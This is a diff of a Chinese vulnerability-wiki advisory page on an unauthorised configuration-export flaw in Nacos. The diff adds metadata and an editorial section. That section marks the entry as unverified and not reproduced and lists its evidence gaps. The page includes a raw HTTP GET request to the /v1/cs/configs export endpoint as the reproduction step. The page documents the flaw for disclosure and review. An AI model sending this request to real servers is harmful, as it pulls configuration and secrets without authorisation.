@@ -1,9 +1,48 @@
 ---
-fofa: "app.name="
 source: "wy876 漏洞文库"
+title: "Nacos存在未授权下载配置信息漏洞"
+product: "Nacos Config Service export API"
+record_type: "advisory"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+prerequisites: "对应版本导出API可达、认证缺失或绕过、配置实际含敏感信息"
+fofa_unverified: "app.name="
+source_status: "unknown"
+side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
+id: "vw-259374702b1ce98714c19cf3"
+entity_id: "ve-259374702b1ce98714c19cf3"
+schema_version: "1"
 ---
 
 # Nacos存在未授权下载配置信息漏洞
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：对应版本导出API可达、认证缺失或绕过、配置实际含敏感信息
+- 证据范围：给无Cookie请求但没有响应或对照，不能证明未授权成立
+
+### 本次正文校订
+
+- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 缺Nacos版本、auth开关和接口权限根因
+- 默认/nacos前缀省略须说明代理context；空Host只占位
+- fofa错字段且不完整，缺修复来源
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 一、漏洞简介
 
@@ -19,7 +58,7 @@ source: "wy876 漏洞文库"
 
 
 # 四、漏洞复现
-```plain
+```http
 GET /v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId= HTTP/1.1
 Host: 
 If-Modified-Since: Wed, 03 Apr 2024 06:25:07 GMT
